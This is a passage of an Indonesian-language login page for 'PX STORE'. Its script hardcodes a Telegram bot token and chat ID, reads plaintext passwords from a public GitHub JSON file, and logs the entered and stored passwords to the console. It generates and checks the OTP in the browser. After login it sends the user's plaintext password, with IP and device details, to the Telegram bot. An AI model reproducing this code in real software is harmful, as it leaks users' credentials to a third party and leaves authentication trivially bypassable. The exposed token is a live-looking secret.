<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="/assets/images/icon.ico" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <title>Login - PX STORE</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* CSS untuk mencegah seleksi teks dan highlight */
        * {
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        
        /* Izinkan seleksi pada input dan textarea */
        input, textarea {
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }
        /* CSS tetap sama seperti sebelumnya */
        :root {
            --primary: #6c63ff;
            --primary-dark: #564fd8;
            --secondary: #4d44db;
            --accent: #9d4edd;
            --dark-bg: #121212;
            --dark-card: #1e1e1e;
            --dark-hover: #2d2d2d;
            --text-primary: #e0e0e0;
            --text-secondary: #a0a0a0;
            --border-radius: 12px;
            --box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            --transition: all 0.3s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: var(--dark-bg);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            width: 100%;
            max-width: 400px;
            background-color: var(--dark-card);
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: var(--box-shadow);
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            border-radius: 50%;
            background-color: var(--primary);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .login-title {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--text-primary);
        }
        
        .login-subtitle {
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-bottom: 30px;
        }
        
        .login-form {
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            background-color: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            font-size: 0.9rem;
            transition: var(--transition);
        }
        
        .form-group input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(108, 99, 255, 0.2);
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            margin-bottom: 20px;
        }
        
        .login-btn:hover {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
        }
        
        .login-btn:disabled {
            background-color: var(--text-secondary);
            cursor: not-allowed;
            transform: none;
        }
        
        .register-link {
            margin-top: 20px;
            text-align: center;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }
        
        .register-link a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
        }
        
        .register-link a:hover {
            text-decoration: underline;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .loading-spinner {
            width: 30px;
            height: 30px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .message {
            padding: 10px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 0.9rem;
            display: none;
        }
        
        .message.success {
            background-color: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }
        
        .message.error {
            background-color: rgba(244, 67, 54, 0.2);
            color: #F44336;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }
        
        .auto-login-info {
            margin-top: 15px;
            padding: 10px;
            background-color: rgba(108, 99, 255, 0.1);
            border-radius: 8px;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }
        
        .telegram-status {
            margin-top: 10px;
            font-size: 0.8rem;
            color: var(--text-secondary);
            display: none;
        }
        
        .footer-text {
            margin-top: 20px;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }
        
        /* MODIFIKASI: Full Screen Loading dengan gambar full tanpa bayangan */
        .fullscreen-loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--dark-bg);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        
        .fullscreen-loading .background-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
        }
        
        .fullscreen-loading .loading-content {
            position: relative;
            z-index: 2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            /* HAPUS background-color agar gambar tampil full tanpa halangan */
        }
        
        .fullscreen-loading .loading-bottom {
            position: absolute;
            bottom: 40px;
            left: 0;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            /* Tambahkan background semi transparan untuk teks agar mudah dibaca */
            background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
            padding: 20px 0;
        }
        
        .fullscreen-loading .mini-loading-spinner {
            width: 25px;
            height: 25px;
            border: 2px solid rgba(255, 255, 255, 0.8);
            border-top: 2px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 10px;
        }
        
        .fullscreen-loading .loading-text {
            font-size: 1rem;
            color: white;
            text-align: center;
            margin-bottom: 5px;
            font-weight: 600;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
        }
        
        .fullscreen-loading .loading-subtext {
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.9);
            text-align: center;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
        }
        
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
            }
            
            .logo {
                width: 70px;
                height: 70px;
            }
            
            .login-title {
                font-size: 1.5rem;
            }
            
            .fullscreen-loading .loading-text {
                font-size: 0.9rem;
            }
            
            .fullscreen-loading .loading-subtext {
                font-size: 0.75rem;
            }
            
            .fullscreen-loading .mini-loading-spinner {
                width: 20px;
                height: 20px;
            }
            
            .fullscreen-loading .loading-bottom {
                bottom: 30px;
                padding: 15px 0;
            }
        }
    </style>
</head>
<body>
    <!-- MODIFIKASI: Full Screen Loading dengan gambar full tanpa bayangan -->
    <div class="fullscreen-loading" id="fullscreenLoading">
        <img src="assets/images/banner.jpg" alt="PX STORE Loading" class="background-image">
        <div class="loading-content">
            <div class="loading-bottom">
                <div class="mini-loading-spinner"></div>
                <div class="loading-text" id="loadingMainText">Memproses Login...</div>
                <div class="loading-subtext" id="loadingSubText">Mohon tunggu sebentar</div>
            </div>
        </div>
    </div>

    <div class="login-container" id="loginContainer">
        <div class="logo">
            <img src="assets/images/icon.ico" alt="PX STORE">
        </div>
        
        <h1 class="login-title">Masuk ke PX STORE</h1>
        <p class="login-subtitle">Silakan masuk untuk mengakses layanan premium kami</p>
        
        <div class="login-form">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" placeholder="nama@email.com" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Masukkan password" required>
            </div>
            
            <button class="login-btn" onclick="handleLogin()">Masuk</button>
        </div>
        
        <div class="register-link">
            Belum punya akun? <a href="#" onclick="showRegisterForm()">Daftar di sini</a>
        </div>
        
        <div class="loading">
            <div class="loading-spinner"></div>
            <p style="text-align: center; margin-top: 10px;">Memproses login...</p>
        </div>
        
        <div class="message" id="message"></div>
        
        <div class="telegram-status" id="telegramStatus">
            <i class="fab fa-telegram"></i> <span id="telegramText">Loading...</span>
        </div>
            
        <p class="footer-text">Dengan masuk, Anda menyetujui Syarat & Ketentuan kami</p>
    </div>

    <!-- Modal untuk pendaftaran -->
    <div id="registerModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center;">
        <div style="background-color: var(--dark-card); border-radius: 20px; padding: 30px; width: 90%; max-width: 400px; box-shadow: var(--box-shadow);">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 style="font-size: 1.5rem;">Daftar Akun Baru</h2>
                <button onclick="closeRegisterForm()" style="background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer;">&times;</button>
            </div>
            
            <div class="form-group">
                <label for="regUsername">Username</label>
                <input type="text" id="regUsername" placeholder="Masukkan username" required>
            </div>
            
            <div class="form-group">
                <label for="regEmail">Email</label>
                <input type="email" id="regEmail" placeholder="nama@email.com" required>
            </div>
            
            <div class="form-group">
                <label for="regPassword">Kata Sandi</label>
                <input type="password" id="regPassword" placeholder="Minimal 6 karakter" required>
            </div>
            
            <div class="form-group">
                <label for="regConfirmPassword">Konfirmasi Kata Sandi</label>
                <input type="password" id="regConfirmPassword" placeholder="Ulangi kata sandi" required>
            </div>
            
            <div class="form-group">
    <label for="regWhatsApp">Nomor WhatsApp </label>
    <input type="tel" id="regWhatsApp" placeholder="Contoh: 628123456789" required>
</div>
            
            <button class="login-btn" onclick="handleRegister()">Daftar</button>
            
            <div class="message" id="registerMessage"></div>
        </div>
    </div>

    <!-- Modal untuk OTP -->
    <div id="otpModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center;">
        <div style="background-color: var(--dark-card); border-radius: 20px; padding: 30px; width: 90%; max-width: 400px; box-shadow: var(--box-shadow);">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 style="font-size: 1.5rem;">Verifikasi OTP</h2>
                <button onclick="closeOtpModal()" style="background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer;">&times;</button>
            </div>
            
            <p style="margin-bottom: 20px; color: var(--text-secondary);">Kode OTP telah dikirim. Silakan input kode OTP untuk melanjutkan login.</p>
            
            <div class="form-group">
                <label for="otpCode">Kode OTP</label>
                <input type="text" id="otpCode" placeholder="Masukkan 6 digit kode OTP" maxlength="6" required>
            </div>
            
            <button class="login-btn" onclick="verifyOtp()">Verifikasi OTP</button>
            
            <div style="margin-top: 15px; text-align: center;">
                <button onclick="resendOtp()" style="background: none; border: none; color: var(--primary); cursor: pointer; font-size: 0.9rem;">Kirim ulang OTP</button>
            </div>
            
            <div class="message" id="otpMessage"></div>
            
            <div class="loading" id="otpLoading" style="display: none;">
                <div class="loading-spinner"></div>
                <p style="text-align: center; margin-top: 10px;">Memverifikasi OTP...</p>
            </div>
        </div>
    </div>

    <script>
        // Konfigurasi Telegram Bot
const TELEGRAM_BOT_TOKEN = '7513756403:AAHxi73Wd_wI2dfm3yoWIWPXYiowXCZkQB4';
const TELEGRAM_CHAT_ID = '7661292905';

// URL JSON di GitHub untuk menyimpan data user
const GITHUB_JSON_URL = 'https://raw.githubusercontent.com/PeyxDev/webapp/main/data/users.json';

// Variabel global untuk menyimpan data sementara
let pendingUserData = null;
let pendingUserPassword = null;
let generatedOtp = null;
let cachedUsersData = null; // Cache untuk data user
let userIP = null; // Cache untuk IP user

// Variabel untuk tracking waktu OTP
let lastOtpRequestTime = null;
const OTP_COOLDOWN_MINUTES = 5; // Jeda 5 menit antara permintaan OTP
let otpCountdownInterval = null; // Interval untuk countdown OTP
let otpExpiryTime = null; // Waktu kedaluwarsa OTP

// ========== MODIFIKASI: Fungsi untuk full screen loading dengan gambar full ==========
// Fungsi untuk menampilkan full screen loading
function showFullScreenLoading(show, text = "Loading...", subtext = "Mohon tunggu sebentar") {
    const fullscreenLoading = document.getElementById('fullscreenLoading');
    const loadingMainText = document.getElementById('loadingMainText');
    const loadingSubText = document.getElementById('loadingSubText');
    
    if (show) {
        loadingMainText.textContent = text;
        loadingSubText.textContent = subtext;
        fullscreenLoading.style.display = 'flex';
        // Sembunyikan login container saat loading
        document.getElementById('loginContainer').style.display = 'none';
    } else {
        fullscreenLoading.style.display = 'none';
        // Tampilkan kembali login container
        document.getElementById('loginContainer').style.display = 'block';
    }
}

// ========== MODIFIKASI: Auto redirect jika sudah login ==========
// Cek apakah user sudah login sebelumnya
function checkLoginStatus() {
    const isLoggedIn = localStorage.getItem('pxstore_logged_in');
    const userData = localStorage.getItem('pxstore_user_data');
    
    if (isLoggedIn === 'true' && userData) {
        // Tampilkan loading full screen
        showFullScreenLoading(true, "Loading...");
        
        // Redirect langsung tanpa delay
        setTimeout(() => {
            window.location.href = 'beranda.html';
        }, 1000);
    }
}

// ========== MODIFIKASI: Handle login dengan full screen loading gambar full ==========
// Handle login - Ambil data dari JSON di GitHub
async function handleLogin() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if (!email || !password) {
        showMessage('Harap isi email dan password!', 'error');
        return;
    }
    
    if (!validateEmail(email)) {
        showMessage('Format email tidak valid!', 'error');
        return;
    }
    
    // Cek cooldown OTP
    if (!canRequestOtp()) {
        const remainingTime = getRemainingCooldownTime();
        showMessage(`Tunggu ${formatTime(remainingTime)} menit sebelum meminta OTP lagi.`, 'error');
        return;
    }
    
    // ========== MODIFIKASI: Tampilkan full screen loading dengan gambar full ==========
    showFullScreenLoading(true, "Memeriksa akun...", "Mengecek data pengguna...");
    
    try {
        // Ambil data user dari cache atau GitHub
        const users = await getUsersFromGitHub();
        console.log('Data users dari GitHub:', users);
        
        // Cari user berdasarkan email dengan struktur nested
        let user = findUserByEmail(users, email);
        console.log('User ditemukan:', user);
        
        // Jika tidak ditemukan di GitHub, coba cari di localStorage
        if (!user) {
            const localData = localStorage.getItem(`pxstore_user_${email}`);
            if (localData) {
                user = JSON.parse(localData);
                console.log('User ditemukan di localStorage:', user);
            }
        }
        
        if (!user) {
            showFullScreenLoading(false);
            showMessage('Email belum terdaftar! Silakan daftar terlebih dahulu.', 'error');
            return;
        }
        
        // Dapatkan password user dengan struktur nested
        const userPassword = getUserPassword(user);
        console.log('Password dari data user:', userPassword);
        console.log('Password yang dimasukkan:', password);
        
        if (!userPassword) {
            showFullScreenLoading(false);
            showMessage('Password tidak ditemukan dalam data user!', 'error');
            return;
        }
        
        // Validasi password
        if (userPassword !== password) {
            showFullScreenLoading(false);
            showMessage('Password salah!', 'error');
            return;
        }
        
        // Simpan data sementara untuk OTP verification
        pendingUserData = user;
        pendingUserPassword = password;
        
        // ========== MODIFIKASI: Update loading text untuk gambar full ==========
        showFullScreenLoading(true, "Mengirim kode OTP...", "Mengirim kode verifikasi ke admin...");
        
        // Generate dan kirim OTP
        await sendOtpForVerification(user);
        
    } catch (error) {
        showFullScreenLoading(false);
        showMessage('Error saat login: ' + error.message, 'error');
    }
}

// ========== MODIFIKASI: Kirim OTP untuk verifikasi dengan full screen loading gambar full ==========
// Kirim OTP untuk verifikasi
async function sendOtpForVerification(user) {
    try {
        // Generate OTP
        generatedOtp = generateOtp();
        
        // Update waktu request OTP terakhir
        lastOtpRequestTime = Date.now();
        
        // Reset waktu kedaluwarsa OTP
        otpExpiryTime = Date.now() + (10 * 60 * 1000); // 10 menit
        
        // Kirim OTP ke admin Telegram
        const otpSent = await sendOtpToTelegram(user, generatedOtp);
        
        showFullScreenLoading(false);
        
        if (otpSent) {
            showMessage('Kode OTP telah dikirim ke admin. Silakan minta kode OTP untuk melanjutkan.', 'success');
            showOtpModal();
            
        } else {
            showMessage('Gagal mengirim OTP. Silakan coba lagi.', 'error');
        }
    } catch (error) {
        showFullScreenLoading(false);
        showMessage('Error mengirim OTP: ' + error.message, 'error');
    }
}

// ========== MODIFIKASI: Verifikasi OTP dengan full screen loading gambar full ==========
// Verifikasi OTP
async function verifyOtp() {
    const otpCode = document.getElementById('otpCode').value;
    
    if (!otpCode || otpCode.length !== 6) {
        showMessage('Masukkan 6 digit kode OTP!', 'error', 'otpMessage');
        return;
    }
    
    if (!generatedOtp) {
        showMessage('Kode OTP tidak valid atau telah kedaluwarsa!', 'error', 'otpMessage');
        return;
    }
    
    if (otpCode !== generatedOtp) {
        showMessage('Kode OTP tidak sesuai!', 'error', 'otpMessage');
        return;
    }
    
    // ========== MODIFIKASI: Tampilkan full screen loading gambar full saat verifikasi OTP ==========
    showFullScreenLoading(true, "Memverifikasi OTP...", "Memvalidasi kode keamanan...");
    
    try {
        // Kirim data login ke Telegram (tidak menunggu selesai)
        sendToTelegram(pendingUserData, pendingUserPassword)
            .then(success => {
                if (success) {
                    showTelegramStatus('✅ Notifikasi berhasil dikirim ke admin', true);
                } else {
                    showTelegramStatus('⚠️ Gagal mengirim notifikasi ke admin', false);
                }
            })
            .catch(err => {
                console.error('Error sending to Telegram:', err);
                showTelegramStatus('⚠️ Gagal mengirim notifikasi ke admin', false);
            });
        
        // Complete login process tanpa menunggu Telegram
        await completeLogin(pendingUserData, pendingUserData.email, pendingUserPassword);
        
    } catch (error) {
        showFullScreenLoading(false);
        showMessage('Error saat verifikasi: ' + error.message, 'error', 'otpMessage');
    }
}

// ========== MODIFIKASI: Complete login dengan full screen loading gambar full ==========
// Complete login process dengan struktur data yang sesuai
async function completeLogin(user, email, password) {
    const currentTime = new Date().toISOString();
    
    // Update data login
    user.login_time = currentTime;
    user.last_ip = userIP || 'Tidak dapat mendeteksi';
    user.last_update = currentTime;
    
    // Update lastLogin di nested structure jika ada
    if (user.user_data) {
        if (user.user_data.user_data) {
            user.user_data.user_data.lastLogin = currentTime;
        } else {
            user.user_data.lastLogin = currentTime;
        }
    }
    
    // Simpan data yang diformat ke localStorage
    localStorage.setItem('pxstore_logged_in', 'true');
    localStorage.setItem('pxstore_user_email', email);
    localStorage.setItem('pxstore_username', getUsername(user));
    localStorage.setItem('pxstore_user_data', JSON.stringify(user));
    localStorage.setItem('pxstore_login_time', currentTime);
    
    // Simpan data individual untuk kompatibilitas
    localStorage.setItem('pxstore_user_balance', getBalance(user).toString());
    localStorage.setItem('pxstore_topup_history', JSON.stringify(user.topup_history || []));
    localStorage.setItem('pxstore_join_date', user.join_date || currentTime);
    
    console.log('Data user yang berhasil login:', user);
    
    // Reset data sementara
    pendingUserData = null;
    pendingUserPassword = null;
    generatedOtp = null;
    
    // Clear countdown interval
    if (otpCountdownInterval) {
        clearInterval(otpCountdownInterval);
        otpCountdownInterval = null;
    }
    
    // ========== MODIFIKASI: Update loading text untuk gambar full screen redirect ==========
    showFullScreenLoading(true, "Login berhasil!", "Mengarahkan ke beranda...");
    
    // Redirect langsung ke beranda tanpa delay
    setTimeout(() => {
        window.location.href = 'beranda.html';
    }, 1500);
}

// ========== FUNGSI LAINNYA TETAP SAMA ==========

// Fungsi untuk mengubah format nomor WhatsApp dari 08 ke 62
function formatWhatsAppNumber(whatsapp) {
    // Hapus semua karakter non-digit
    let cleanNumber = whatsapp.replace(/\D/g, '');
    
    // Jika dimulai dengan 0, ganti dengan 62
    if (cleanNumber.startsWith('0')) {
        cleanNumber = '62' + cleanNumber.substring(1);
    }
    
    // Jika dimulai dengan 8, tambahkan 62
    if (cleanNumber.startsWith('8')) {
        cleanNumber = '62' + cleanNumber;
    }
    
    return cleanNumber;
}

// Fungsi untuk cek apakah bisa request OTP baru
function canRequestOtp() {
    if (!lastOtpRequestTime) return true;
    
    const now = Date.now();
    const cooldownTime = OTP_COOLDOWN_MINUTES * 60 * 1000; // 5 menit dalam milidetik
    const timeSinceLastRequest = now - lastOtpRequestTime;
    
    return timeSinceLastRequest >= cooldownTime;
}

// Fungsi untuk mendapatkan waktu tersisa sampai bisa request OTP lagi
function getRemainingCooldownTime() {
    if (!lastOtpRequestTime) return 0;
    
    const now = Date.now();
    const cooldownTime = OTP_COOLDOWN_MINUTES * 60 * 1000;
    const timeSinceLastRequest = now - lastOtpRequestTime;
    const remainingTime = cooldownTime - timeSinceLastRequest;
    
    return Math.max(0, Math.ceil(remainingTime / 1000)); // Dalam detik
}

// Fungsi untuk format waktu countdown
function formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
}

// Fungsi untuk memulai countdown OTP
function startOtpCountdown() {
    const otpCountdownElement = document.getElementById('otpCountdown');
    const resendOtpButton = document.querySelector('button[onclick="resendOtp()"]');
    
    if (!otpExpiryTime) {
        otpExpiryTime = Date.now() + (5 * 60 * 1000); // 10 menit dari sekarang
    }
    
    // Clear existing interval
    if (otpCountdownInterval) {
        clearInterval(otpCountdownInterval);
    }
    
    otpCountdownInterval = setInterval(() => {
        const now = Date.now();
        const timeLeft = otpExpiryTime - now;
        
        if (timeLeft <= 0) {
            clearInterval(otpCountdownInterval);
            if (otpCountdownElement) {
                otpCountdownElement.textContent = 'Kode OTP telah kedaluwarsa';
                otpCountdownElement.style.color = '#F44336';
            }
            if (resendOtpButton) {
                resendOtpButton.disabled = false;
                resendOtpButton.textContent = 'Kirim ulang OTP';
            }
            generatedOtp = null;
        } else {
            const minutes = Math.floor(timeLeft / 60000);
            const seconds = Math.floor((timeLeft % 60000) / 1000);
            if (otpCountdownElement) {
                otpCountdownElement.textContent = `Kode OTP berlaku: ${minutes}:${seconds.toString().padStart(2, '0')}`;
                otpCountdownElement.style.color = '#4CAF50';
            }
            if (resendOtpButton) {
                resendOtpButton.disabled = true;
                resendOtpButton.textContent = `Loading..`;
            }
        }
    }, 1000);
}

// Preload data saat halaman dimuat
async function preloadData() {
    try {
        // Preload IP address
        getUserIP().then(ip => userIP = ip);
        
        // Preload users data dengan timeout
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 3000)
        );
        
        const usersPromise = getUsersFromGitHub();
        cachedUsersData = await Promise.race([usersPromise, timeoutPromise]);
        console.log('Data user berhasil dipreload');
    } catch (error) {
        console.log('Preload data gagal, akan diload saat diperlukan:', error.message);
    }
}

// Fungsi untuk mencari user berdasarkan email dengan struktur nested
function findUserByEmail(users, email) {
    return users.find(user => {
        // Cek berbagai kemungkinan lokasi email
        if (user.email === email) return true;
        if (user.user_data) {
            // Cek di user_data level 1
            if (user.user_data.email === email) return true;
            // Cek di user_data level 2 (nested)
            if (user.user_data.user_data && user.user_data.user_data.email === email) return true;
        }
        return false;
    });
}

// Fungsi untuk mendapatkan password dari user dengan struktur nested
function getUserPassword(user) {
    // Cek berbagai kemungkinan lokasi password
    if (user.password) return user.password;
    if (user.user_data) {
        // Cek di user_data level 1
        if (user.user_data.password) return user.user_data.password;
        // Cek di user_data level 2 (nested)
        if (user.user_data.user_data && user.user_data.user_data.password) return user.user_data.user_data.password;
    }
    return null;
}

// Fungsi untuk mendapatkan nomor WhatsApp dari user dengan struktur nested
function getUserWhatsApp(user) {
    // Cek berbagai kemungkinan lokasi WhatsApp
    if (user.whatsapp) return user.whatsapp;
    if (user.user_data) {
        // Cek di user_data level 1
        if (user.user_data.whatsapp) return user.user_data.whatsapp;
        // Cek di user_data level 2 (nested)
        if (user.user_data.user_data && user.user_data.user_data.whatsapp) return user.user_data.user_data.whatsapp;
    }
    return null;
}

// Fungsi untuk mendapatkan username dari user dengan struktur nested
function getUsername(user) {
    if (user.username) return user.username;
    if (user.user_data) {
        if (user.user_data.username) return user.user_data.username;
        if (user.user_data.user_data && user.user_data.user_data.username) return user.user_data.user_data.username;
    }
    return 'Tidak diketahui';
}

// Fungsi untuk mendapatkan balance dari user dengan struktur nested
function getBalance(user) {
    // Prioritaskan balance dari root level, lalu dari nested
    if (user.balance !== undefined) return user.balance;
    if (user.user_data) {
        if (user.user_data.balance !== undefined) return user.user_data.balance;
        if (user.user_data.user_data && user.user_data.user_data.balance !== undefined) return user.user_data.user_data.balance;
    }
    return 0;
}

// Get user IP address dengan cache
async function getUserIP() {
    if (userIP) return userIP; // Return cached IP
    
    try {
        // Gunakan multiple services sebagai fallback
        const services = [
            'https://api.ipify.org?format=json',
            'https://api64.ipify.org?format=json',
            'https://ipinfo.io/json'
        ];
        
        for (const service of services) {
            try {
                const response = await fetch(service, { 
                    signal: AbortSignal.timeout(2000) // Timeout 2 detik
                });
                if (response.ok) {
                    const data = await response.json();
                    userIP = data.ip || 'Tidak dapat mendeteksi';
                    return userIP;
                }
            } catch (error) {
                console.log(`Service ${service} gagal, mencoba yang lain...`);
            }
        }
        
        return 'Tidak dapat mendeteksi';
    } catch (error) {
        return 'Tidak dapat mendeteksi';
    }
}

// Get device info
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Desktop';
    
    if (/Android/i.test(ua)) device = 'Android';
    else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
    else if (/Windows/i.test(ua)) device = 'Windows';
    else if (/Mac/i.test(ua)) device = 'Mac';
    else if (/Linux/i.test(ua)) device = 'Linux';
    
    return device;
}

// Get browser info
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Edg/.test(ua)) browser = 'Edge';
    else if (/Opera|OPR/.test(ua)) browser = 'Opera';
    
    return browser;
}

// Get platform info
function getPlatformInfo() {
    return navigator.platform || 'Unknown';
}

// Get language info
function getLanguageInfo() {
    return navigator.language || 'Unknown';
}

// Show message
function showMessage(text, type, elementId = 'message') {
    const messageEl = document.getElementById(elementId);
    messageEl.textContent = text;
    messageEl.className = `message ${type}`;
    messageEl.style.display = 'block';
    
    setTimeout(() => {
        messageEl.style.display = 'none';
    }, 5000);
}

// Show loading
function showLoading(show) {
    document.querySelector('.loading').style.display = show ? 'block' : 'none';
}

// Show Telegram status
function showTelegramStatus(text, isSuccess = true) {
    const telegramStatus = document.getElementById('telegramStatus');
    const telegramText = document.getElementById('telegramText');
    
    telegramText.textContent = text;
    telegramStatus.style.color = isSuccess ? '#4CAF50' : '#F44336';
    telegramStatus.style.display = 'block';
}

// Validasi email
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Validasi username
function validateUsername(username) {
    const re = /^[a-zA-Z0-9_]{3,20}$/;
    return re.test(username);
}

// Validasi nomor WhatsApp
function validateWhatsApp(whatsapp) {
    const re = /^\d{10,15}$/;
    return re.test(whatsapp);
}

// Validasi password
function validatePassword(password) {
    return password.length >= 6;
}

// Ambil data user dari JSON di GitHub dengan cache
async function getUsersFromGitHub() {
    // Gunakan cache jika tersedia
    if (cachedUsersData) {
        return cachedUsersData;
    }
    
    try {
        // Tambahkan timestamp untuk menghindari cache
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // Timeout 5 detik
        
        const response = await fetch(GITHUB_JSON_URL + '?t=' + Date.now(), {
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            throw new Error('Gagal mengambil data dari GitHub');
        }
        
        const data = await response.json();
        
        // Handle berbagai format JSON yang mungkin
        let users;
        if (Array.isArray(data)) {
            users = data; // Jika JSON berupa array langsung
        } else if (data.users && Array.isArray(data.users)) {
            users = data.users; // Jika JSON memiliki properti "users"
        } else {
            // Jika format tidak dikenali, anggap sebagai object user tunggal
            users = [data];
        }
        
        // Cache hasil
        cachedUsersData = users;
        return users;
    } catch (error) {
        console.error('Error mengambil data dari GitHub:', error);
        // Fallback ke localStorage jika GitHub tidak tersedia
        const localData = localStorage.getItem('pxstore_users_data');
        if (localData) {
            try {
                const parsed = JSON.parse(localData);
                cachedUsersData = Array.isArray(parsed) ? parsed : [parsed];
                return cachedUsersData;
            } catch (e) {
                console.error('Error parsing local data:', e);
            }
        }
        return [];
    }
}

// Cek apakah email sudah terdaftar di GitHub
async function isEmailRegistered(email) {
    const users = await getUsersFromGitHub();
    return users.some(user => {
        // Cek di berbagai level struktur
        if (user.email === email) return true;
        if (user.user_data) {
            if (user.user_data.email === email) return true;
            if (user.user_data.user_data && user.user_data.user_data.email === email) return true;
        }
        return false;
    });
}

// Cek apakah username sudah terdaftar di GitHub
async function isUsernameRegistered(username) {
    const users = await getUsersFromGitHub();
    return users.some(user => {
        // Cek di berbagai level struktur
        if (user.username === username) return true;
        if (user.user_data) {
            if (user.user_data.username === username) return true;
            if (user.user_data.user_data && user.user_data.user_data.username === username) return true;
        }
        return false;
    });
}

// Generate OTP 6 digit
function generateOtp() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Send OTP to Telegram admin dengan timeout
async function sendOtpToTelegram(userData, otp) {
    try {
        const currentTime = new Date().toLocaleString('id-ID');
        const deviceInfo = getDeviceInfo();
        
        // Ekstrak data dari struktur nested
        const username = getUsername(userData);
        const email = userData.email || (userData.user_data && userData.user_data.email) || 
                     (userData.user_data && userData.user_data.user_data && userData.user_data.user_data.email) || 
                     'Tidak diketahui';
        const whatsapp = getUserWhatsApp(userData) || '-';
        
        // Buat link WhatsApp untuk admin
